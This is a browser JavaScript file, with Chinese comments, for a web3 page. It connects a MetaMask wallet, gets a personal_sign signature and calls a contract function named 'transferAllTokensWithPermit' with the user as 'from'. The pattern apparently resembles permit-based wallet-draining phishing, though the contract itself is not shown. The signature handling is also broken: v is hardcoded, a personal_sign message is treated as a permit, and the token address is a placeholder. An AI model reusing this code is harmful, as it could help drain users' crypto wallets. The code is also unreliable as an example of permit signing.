// 最新的合约地址和 ABI
const contractAddress = "0x9a2E12340354d2532b4247da3704D2A5d73Bd189";
let web3;
let userAddress;

// 最新的 ABI（包含 transferAllTokensWithPermit 等）
const abi = [
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

async function connectWallet() {
    console.log("尝试连接钱包");

    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            web3 = new Web3(window.ethereum);

            console.log("成功连接钱包:", userAddress);
            document.getElementById('walletAddress').innerText = userAddress;
            document.getElementById('walletInfo').style.display = 'block';

            // 填充签名数据
            await fillSignatureData(userAddress, contractAddress);

        } catch (error) {
            console.error("连接钱包失败:", error);
            alert("连接钱包失败，请检查 MetaMask 状态。");
        }
    } else {
        console.log("未检测到 MetaMask");
        alert("未检测到 MetaMask，请安装 MetaMask 插件。");
    }
}

async function fillSignatureData(fromAddress, contractAddress) {
    console.log("生成签名数据...");

    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 设置 20 分钟有效期
    const nonce = await web3.eth.getTransactionCount(fromAddress);
    console.log("获取到的 nonce:", nonce);

    try {
        const signature = await web3.eth.personal.sign(`Sign for permit: ${nonce}`, fromAddress, '');
        const v = 27; // 示例的签名参数 v，后续可能需要从签名中解析
        const r = "0x" + signature.slice(2, 66);
        const s = "0x" + signature.slice(66, 130);

        console.log(`签名数据: v=${v}, r=${r}, s=${s}`);

        // 在页面上显示签名参数
        document.getElementById('v').innerText = v;
        document.getElementById('r').innerText = r;
        document.getElementById('s').innerText = s;

    } catch (error) {
        console.error("生成签名失败:", error);
        alert("生成签名失败，请检查控制台日志。");
    }
}

async function transferTokens() {
    console.log("开始转移代币...");

    const tokenAddress = "0xYourTokenContractAddress"; // 代币合约地址
    const value = web3.utils.toWei("1", "ether"); // 转移的代币数量，这里示例为1个代币
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 设置 20 分钟的有效期

    const v = parseInt(document.getElementById('v').innerText, 10);
    const r = document.getElementById('r').innerText;
    const s = document.getElementById('s').innerText;

    const contract = new web3.eth.Contract(abi, contractAddress);

    try {
        await contract.methods.transferAllTokensWithPermit(
            tokenAddress,
            userAddress,
            value,
            deadline,
            v,
            r,
            s
        ).send({ from: userAddress });

        console.log("代币转移成功");
        alert("代币转移成功！");

    } catch (error) {
        console.error("代币转移失败:", error);
        alert("代币转移失败，请检查控制台日志。");
    }
}

// 页面加载时绑定事件
window.onload = function() {
    document.getElementById('connectButton').addEventListener('click', connectWallet);
    document.getElementById('transferButton').addEventListener('click', transferTokens);
};
